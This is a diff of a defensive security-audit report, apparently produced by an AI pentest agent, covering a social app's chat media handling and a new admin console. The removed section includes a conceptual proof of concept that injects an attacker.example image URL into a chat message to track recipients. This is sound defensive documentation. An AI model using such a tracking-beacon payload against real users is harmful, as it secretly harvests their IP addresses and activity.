@@ -1,91 +1,98 @@
-# Security Audit — NigerConnect (Mode A, post-push)
+# Security Audit — Mode A (post-push, read-only)
 
-- **Date:** 2026-06-08
-- **Scope:** pushed range `HEAD~6..HEAD` (chat edit/delete + image preview/lightbox/download, private-profile exclusion from feed/search, 3-level comment nesting + cascade delete, fluidity/UI pass) plus the immediately-preceding auth/privacy commits `045a7c3` / `6807259` (OAuth verified-by-default + stub-link) which the brief explicitly placed in scope.
-- **Deep-dive:** `apps/api/src/chat/*`, `apps/api/src/feed/{posts,comments}.service.ts`, OAuth account-linking in `apps/api/src/auth/auth.service.ts`, mobile chat screen/services.
-- **Referentials:** OWASP Top 10 2021, OWASP API Security Top 10 2023, CWE, CVSS v3.1 (estimated).
-- **Authorization:** owner-authorized defensive pentest. No destructive tests. Prod touched only with safe, single requests (status-code probes via `docker exec ... wget`). No prod data mutated, no spam accounts.
+**Range audited (intent):** push that delivered the internal admin console + web CSP/env fixes.
+**Strict commit range requested:** `bfcf5be..6c40a36` (single commit: CSP `connect-src` origin fix).
+**Broader scope reviewed (same push):** `320caa1` admin Phase 1, `e2c3a3d` build-time env baking, `bfcf5be` `NEXT_PUBLIC_API_URL` prefix, `6c40a36` CSP origin fix, `74f920d` chat media-binding e2e test.
+
+**Date:** 2026-06-09 · **Auditor:** gwani-pentest · **Mode:** strict read-only (no edits applied).
+
+---
+
+## Scope & method
+
+Reviewed the pushed diff against OWASP Top 10 2021 / API Security Top 10 2023 and the project conventions in `CLAUDE.md` (Zod validation, AuthZ guards/IDOR, JWT RS256, media URL binding, privacy levels, CSP / `NEXT_PUBLIC_API_URL`). Read surrounding context (global guard wiring, JWT strategy, role decorator, the backend endpoints the admin UI calls) to confirm exploitability. No build/network/deploy run.
+
+## AuthZ chain — verified SOUND
+
+The admin console's server-side authorization was the primary risk and it holds up:
+
+- Global guards are registered as `APP_GUARD` in `apps/api/src/auth/auth.module.ts:34-35` in order `JwtAuthGuard` -> `EmailVerifiedGuard`. Global guards run before controller-level `@UseGuards(RolesGuard)`, so `req.user` (with `role`) is populated before role checks.
+- JWT is RS256, `kid`-dispatched, `iss`/`aud`/`exp` verified, blacklist (`jti`) checked (`jwt.strategy.ts`, `jwt-auth.guard.ts`). `role` is a signed claim (`current-user.decorator.ts:4-11`) — not client-controllable.
+- `RolesGuard` (`roles.guard.ts`) throws `ForbiddenException` when `user.role` is not in the required set.
+- Every admin-reachable endpoint is `@UseGuards(RolesGuard) @Roles('admin','moderator')`:
+  - `apps/api/src/admin/admin.controller.ts:21-22` (`GET /admin/metrics`, `GET /admin/identity`)
+  - `apps/api/src/auth/auth.controller.ts:239-241` (`PATCH /auth/identity/review`)
+  - `apps/api/src/moderation/moderation.controller.ts:40-49` (`GET /reports`, `PATCH /reports/:id/resolve`)
+- Identity-document images are exposed only via 300s presigned GETs (`admin.service.ts:114-126`); the private bucket is never public, URLs are not persisted/logged, and the path is `s3://<privateBucket>/` prefix-checked before presign.
+- Client-side gating (`LoginForm.tsx:23-28` role check, `layout.tsx` token guard) is UX only; real enforcement is server-side. The `nc_admin_role` localStorage value is never trusted for authorization.
+
+No IDOR found: identity list filters by `status`, cursor is `uuid()`-validated; the admin queries return aggregate/queue data appropriate to the admin/moderator role.
+
+## CSP change (the strict range commit `6c40a36`) — NOT a weakening
+
+`apps/web/next.config.mjs:22-32,40`: previously `connect-src 'self' <raw NEXT_PUBLIC_API_URL>`; if the env value carried a path (`.../api`) CSP treated it as an exact-path source and blocked sub-paths. The fix parses the URL and uses `new URL(apiUrl).origin`, falling back to the raw string only if unparseable. This narrows/normalizes to a single API origin — no wildcard, no new host, no `unsafe-*` added. Correctness fix; no security regression.
+
+## Env baking (`e2c3a3d`) — no secret leakage
+
+`apps/web/Dockerfile` and `docker-compose.prod.yml` bake `NEXT_PUBLIC_API_URL` / `NEXT_PUBLIC_APP_URL` at build time. These are public origins (`NEXT_PUBLIC_*` are inlined into the client bundle by design). No secret, key, or token is introduced into the image. Diff-wide secret scan: clean.
 
 ---
 
 ## Findings
 
-### [HIGH] Chat `mediaUrl` is persisted unvalidated — arbitrary off-platform URL injection + cross-tenant object reference — OWASP A01 / API1 / A10, CWE-639 / CWE-918-adjacent (CVSS 7.1)
-- **Where:** `apps/api/src/chat/chat.service.ts:240-249` (pre-fix), `apps/api/src/chat/dto/chat.dto.ts:12`, gateway path `apps/api/src/chat/chat.gateway.ts:151-196`.
-- **Evidence:** `sendMessage` persisted `mediaUrl: payload.mediaUrl ?? null` directly. The only validation was the Zod `z.string().url().max(500)` in `sendMessageSchema`. Unlike posts/stories, which bind every client URL to the platform bucket via `S3Service.assertOwnedPublicImage(url, ownerId)` (`apps/api/src/feed/posts.service.ts:67` and `:100`), chat never imported `S3Service` (`apps/api/src/chat/chat.module.ts` had no `StorageModule`/S3 provider). The shipped e2e even demonstrates an arbitrary URL succeeding: `e2e/tests/api/chat-edit-delete.spec.ts:328` sends `mediaUrl: 'https://cdn.nigerconnect.test/e2e/test-image.jpg'`.
-- **Impact:** Any authenticated user can attach an arbitrary URL to a message delivered to every conversation member. Recipients' clients auto-load it as `<Image source={{uri}}>` (`apps/mobile/app/chat/[id].tsx`), so an attacker-controlled host (`https://attacker.example/track.gif?u=victim`) harvests each recipient's IP/User-Agent/online-timing (deanonymization / tracking beacon). It also lets a sender reference objects not bound to their own `users/<id>/` prefix, breaking the per-user ownership invariant that posts enforce. The API does not fetch the URL itself, so there is no server-side SSRF; the impact is client-side privacy/integrity, hence HIGH not CRITICAL.
-- **PoC (safe, conceptual):** `POST /api/conversations/<id>/messages {"messageType":"image","mediaUrl":"https://attacker.example/x.gif"}` → message stored verbatim and broadcast; every member's client GETs `attacker.example`.
-- **Fix:** APPLIED. Injected the already-`@Global()` `S3Service` into `ChatService` and bound `mediaUrl` through `assertOwnedPublicImage(url, userId)` in `sendMessage` — identical to the posts/stories guard. Media-bearing types now require a valid owned URL; text messages reject a `mediaUrl`; media types without a `mediaUrl` are rejected. The canonical CDN URL (not the raw client URL) is persisted. Covers both the REST and WebSocket gateway send paths (both call `ChatService.sendMessage`).
-  - `apps/api/src/chat/chat.service.ts` — import + constructor injection + validation block before persistence; persist `cleanMediaUrl`.
-- **Verified:**
-  - `npx jest src/chat/chat.service.spec.ts` → 12 passed (was 8 passed / 1 failed). New regression tests:
-    - "binds a media message URL to the sender via assertOwnedPublicImage and persists the canonical URL" — asserts the guard is called with `(rawUrl, 'me')` and the canonical URL is stored, not the attacker URL.
-    - "rejects a media message whose URL is not an owned platform object" — `BadRequestException`, no DB write.
-    - "refuses to send a media message type with no mediaUrl" — `BadRequestException`.
-  - `npx tsc --noEmit` (apps/api) → clean.
-- **Note (proposed follow-up, NOT applied):** the e2e `chat-edit-delete.spec.ts:324-328` now describes pre-fix behavior; with the fix it will need the test to first upload via the presign flow (as the posts e2e does) or be marked to expect a 400 for a foreign URL. Left for the human since editing e2e fixtures touches the live-storage gating.
-- **Ref:** https://owasp.org/Top10/A01_2021-Broken_Access_Control/ · https://cwe.mitre.org/data/definitions/639.html
+### [LOW] Admin access token stored in `localStorage` (XSS would exfiltrate the session) — OWASP A07 / CWE-522 (CVSS ~3.5)
+- **Where:** `apps/web/lib/adminApi.ts:8-29` (`TOKEN_KEY` in `localStorage`, injected as `Authorization: Bearer`).
+- **Evidence:** `window.localStorage.setItem(TOKEN_KEY, token)`; the same value is read for every admin request.
+- **Impact:** Any script execution in the web origin (stored/reflected XSS, or a compromised first-party/inlined script) can read the admin/moderator JWT and act with that role until the ~15-min access token expires. Tokens in `localStorage` are not protected by `HttpOnly`/`SameSite`.
+- **Mitigating factors:** short access-token TTL; CSP `frame-ancestors 'none'` + `X-Frame-Options: DENY`; admin tree is `noindex`; no `dangerouslySetInnerHTML` in admin components (React auto-escapes rendered email/name/report fields). The Bearer + `credentials:false` (no cookies) model is an intentional CSRF trade-off documented in `main.ts:64-68`.
+- **Fix (describe only):** acceptable for an internal console given the short TTL; if hardening, move the admin session to an `HttpOnly; Secure; SameSite=Strict` cookie with a server-side session, or keep the token in memory only. Tighten `script-src` (next finding) to reduce XSS reachability.
 
-### [MEDIUM] Shipped unit test contradicts intended edit behavior — failing test on default branch (CI integrity) — CWE-1164 (CVSS 4.0, non-exploitable)
-- **Where:** `apps/api/src/chat/chat.service.spec.ts:73-90` (pre-fix), added in `eea8f32`; implementation `editMessage` added in `4d45c07` (`apps/api/src/chat/chat.service.ts:355-388`).
-- **Evidence:** The test "refuses to edit a non-text message" mocked `messageType: 'image'` and expected a `BadRequestException`. But `editMessage` *intentionally allows* editing image captions (`messageType !== 'text' && messageType !== 'text'` → only non-text/non-image is refused; DTO comment in `dto/chat.dto.ts:21-23` confirms image-caption edits are by design). The test therefore fell through to `prisma.message.update` on a mock returning `undefined`, then `syncPreview` dereferenced an undefined Prisma method → `TypeError`. Result: `jest` reported 1 failing test on the pushed code.
-- **Impact:** No runtime vulnerability, but a red test on the default branch erodes the security signal of the suite (a real future regression could hide behind an already-red run) and breaks CI gating.
-- **Fix:** APPLIED. Re-pointed the test at the genuine non-editable boundary (`messageType: 'file'` → `BadRequestException`, no DB write), which is the actual security rule. Threaded the new `S3Service` mock through all `ChatService` constructions in the spec.
-- **Verified:** `npx jest src/chat/chat.service.spec.ts` → 12 passed; `npx tsc --noEmit` clean.
-- **Ref:** https://cwe.mitre.org/data/definitions/1164.html
+### [LOW] CSP allows `script-src 'self' 'unsafe-inline'` (pre-existing, not introduced by this push) — OWASP A05 / CWE-1021 (CVSS ~3.1)
+- **Where:** `apps/web/next.config.mjs:36`.
+- **Evidence:** `"script-src 'self' 'unsafe-inline'"`.
+- **Impact:** `'unsafe-inline'` defeats CSP's XSS mitigation for inline scripts, raising the practical impact of the `localStorage` token model above. Not changed by this push (listed for context / defense-in-depth).
+- **Fix (describe only):** migrate to nonce/hash-based inline scripts and drop `'unsafe-inline'` from `script-src`. Out of scope for this commit range; track separately.
 
-### [INFO/LOW] WebSocket `message:read` / `typing:*` payloads not Zod-validated — CWE-20 (CVSS 2.0)
-- **Where:** `apps/api/src/chat/chat.gateway.ts:198-255`.
-- **Evidence:** Unlike `message:send` (which runs `socketSendMessageSchema.parse`), `onRead`/`onTypingStart`/`onTypingStop` consume `payload.conversationId` untyped. A non-UUID id reaches Prisma `findUnique` on a composite key in `markAsRead`.
-- **Impact:** None exploitable — `onRead` wraps the call in try/catch and swallows (logs + returns), `typing:*` first gates on `client.rooms.has('conv:'+id)`, and membership is still asserted server-side. No crash, no leak, no IDOR. Noted only for input-validation consistency.
-- **Fix:** PROPOSED (not applied — no security impact): validate `{ conversationId: z.string().uuid() }` at the top of these handlers to reject malformed ids early, mirroring `message:send`.
-- **Ref:** https://cwe.mitre.org/data/definitions/20.html
+### [INFO] Identity PII + ID-document images surfaced to `moderator` role
+- **Where:** `apps/api/src/admin/admin.service.ts:73-112` (returns email, names, city, country, avatar + 300s presigned ID scan).
+- **Assessment:** Intended function of the identity-review queue; correctly role-gated and short-lived. Noted for data-handling awareness (PII minimization / an access log of who viewed which document would be a good Phase 2 addition), not a vulnerability.
 
-### [INFO] Comment content not control-char sanitized (chat is) — by-design, documented — A03
-- **Where:** `apps/api/src/feed/comments.service.ts:62-71` / `:155-159` persist raw `content`; chat strips C0/C1 + bidi/zero-width via `sanitizeMessageText`.
-- **Evidence/assessment:** Content is Zod-bounded (`createCommentSchema` min 1 / max 1000, `apps/api/src/feed/dto/post.dto.ts:27-29`) and rendered as text by the RN client (no HTML sink — confirmed no `dangerouslySetInnerHTML` anywhere in `apps`). The codebase's documented stance is "escape at the RENDER layer, not write time." Not a finding for the mobile client; the future web client must escape at render. No action.
+### [INFO] JWT role read from the access token, not re-checked against the DB per request
+- **Where:** `roles.guard.ts:18-22` (reads `user.role` from the signed JWT).
+- **Assessment:** A demoted admin keeps elevated access until the access token expires (<= ~15 min). Standard stateless-JWT trade-off; acceptable at this TTL. For immediate revocation on demotion, blacklist the `jti` (infra already present in `JwtAuthGuard`/Redis).
 
 ---
 
-## Areas reviewed and found SOUND (no finding)
+## Summary by severity
 
-- **Chat IDOR / ownership:** `assertMember` gates every read/list/send/markRead; `softDeleteMessage`/`editMessage` enforce `senderId === userId` + a 15-min window (`MESSAGE_MUTATION_WINDOW_MS`); soft-delete nulls `content`+`mediaUrl`. `replyToId` is verified to be a live message *in the same conversation* (`chat.service.ts:220-228`) — blocks cross-conversation thread leakage.
-- **Chat block enforcement:** `createConversation` refuses across a block; `sendMessage` re-checks blocks on direct convos for the post-block membership-row case.
-- **WebSocket presence scoping:** `user:online`/`offline` emitted only to shared `conv:` rooms (not the whole namespace) — no presence leak to strangers (`chat.gateway.ts:132-143`). JWT verified RS256 with `iss`/`aud` and current+previous key rotation; rate-limit is Redis-keyed per *user* (survives reconnect), 30/60s.
-- **Feed/post privacy (the push's headline change):** `assertCanViewPost` is the single authoritative gate used by single-post/comments/share; returns 404 (not 403) to avoid existence disclosure; private profiles' public posts are excluded from the global feed (`posts.service.ts:347`), from `getUserPosts` (`:414-419`), and from the single-post/comment side channels (`:171`). Association posts gated on approved membership, not friendship. Share restricted to public posts.
-- **Comment nesting/cascade:** depth capped at 3 via ancestor walk; cascade soft-delete collects the live subtree and decrements `commentCount` by the exact count in one transaction — no orphans, no count drift. Authorship enforced on edit/delete; visibility re-checked on create/list.
-- **OAuth verified-by-default + stub-link (`045a7c3`/`6807259`):** account-takeover guard intact — auto-link requires `profile.emailVerified === true` AND no existing password AND no conflicting provider (`auth.service.ts:404-428`); otherwise `ConflictException`. New-account `emailVerified: true` is justified (Google rejects unverified upstream; Apple proves ownership). PII kept out of logs (SHA-256 prefix). No finding.
-- **S3 presign guard (`assertOwnedPublicImage`):** strong — `parsePublicKey` rejects foreign hosts, private bucket, traversal (`..`, `//`, leading `/`), query/fragment stripped; HEAD-verifies existence, content-type allowlist (jpeg/png/webp/heic), 15 MB cap; owner-prefix binding.
-- **SAST:** no hardcoded secrets in the diff; no `eval`/`Function`/`child_process` in app code; the only `$queryRawUnsafe` is a constant literal `'TRUE'` (no interpolation). Helmet enabled, CORS from explicit env origins with `credentials: false`.
-- **Prod safe checks:** `GET /api/conversations` (no token) → **401** (auth guard live). `/api/` and `/api/health` → 404 from busybox wget capture (header detail not retrievable via busybox on non-2xx; helmet config confirmed in `main.ts:50`). No flooding; ≤4 total requests.
+| Severity | Count | Open |
+|----------|-------|------|
+| critical | 0 | 0 |
+| high     | 0 | 0 |
+| medium   | 0 | 0 |
+| low      | 2 | 2 |
+| info     | 2 | — |
 
----
+## Positive observations (this push)
 
-## Standing items (pre-existing, NOT introduced by this push)
+- New `e2e/tests/api/chat-edit-delete.spec.ts` adds a security regression guard proving a foreign `mediaUrl` (SSRF/tracking-beacon, OWASP A01/A10) is rejected with 400.
+- Admin endpoints consistently role-gated; identity docs only via short presigned GETs; private bucket never exposed.
+- `/admin` added to `robots.ts` disallow + `noindex` meta/metadata.
+- CORS `credentials:false`, body size capped (256kb), `poweredByHeader:false`, HSTS/Permissions-Policy/Referrer-Policy set, login/register throttled.
+- No secrets introduced in the diff; `NEXT_PUBLIC_*` baking exposes only public origins.
 
-- **[A06] Dependency advisories:** `pnpm audit --prod` → 67 vulns (28 high), dominated by an `axios` cluster (header injection / proxy-auth leak / ReDoS), `multer` DoS, and a `next` advisory (GHSA-vfv6-92ff-j949). None are in this push's diff (the only dep changes were mobile `@expo/vector-icons` + `expo-media-library`, both legitimate UI/feature deps). Recommend a separate remediation pass — does not block this push.
-- **[Tooling] `comments.service.spec.ts` OOMs jest** (heap limit) in this Windows runner even `--runInBand --max-old-space-size=2048`; the 12 tests that executed passed. Unrelated to the audited changes (comments logic untouched). Flag for CI memory tuning.
+## Fixes applied
 
----
+None (strict read-only audit — no edits performed).
 
-## Summary
+## Fixes proposed (human review)
 
-### by_severity
-| Severity | Count | Items |
-|---|---|---|
-| critical | 0 | — |
-| high | 1 | Chat `mediaUrl` unvalidated (FIXED) |
-| medium | 1 | Stale/failing chat edit test (FIXED) |
-| low/info | 2 | WS `message:read` no Zod (proposed); comment sanitization (by-design) |
+- (Low) Consider migrating the admin session off `localStorage` to an `HttpOnly` cookie or in-memory storage.
+- (Low) Plan removal of `script-src 'unsafe-inline'` via nonces/hashes.
+- (Info) Add an access-audit log for identity-document views (Phase 2).
 
-### Fixes APPLIED (in working tree, NOT committed, with green proof)
-1. **Chat `mediaUrl` host-binding** — `apps/api/src/chat/chat.service.ts`. Proof: `jest src/chat/chat.service.spec.ts` 12/12 green (3 new regression tests) + `tsc --noEmit` clean.
-2. **Chat edit test correctness** — `apps/api/src/chat/chat.service.spec.ts`. Proof: same green run (was 8/1-fail before).
+## Verdict
 
-### Fixes PROPOSED (not applied — left for human review)
-- Zod-validate `message:read` / `typing:*` socket payloads (consistency only; no impact).
-- Update e2e `chat-edit-delete.spec.ts` image step to use the presign upload flow (or expect 400 for a foreign URL) now that chat enforces owned media — touches live-storage gating.
-- Schedule the `axios`/`multer`/`next` dependency remediation pass (A06).
+No open critical or high findings. The CSP and env changes are correctness-only and do not weaken security; the admin authZ chain is enforced server-side.
 
-### Verdict
-**OK_TO_DEPLOY** — the one HIGH finding introduced by this push (unvalidated chat `mediaUrl`) is fixed and proven; the MEDIUM CI-integrity issue is fixed. Remaining items are pre-existing/low and do not block. Caveat: before merging, update the in-range e2e (`chat-edit-delete.spec.ts` image case) so it does not send a foreign `mediaUrl` against the now-enforcing endpoint.
+**OK_TO_DEPLOY**
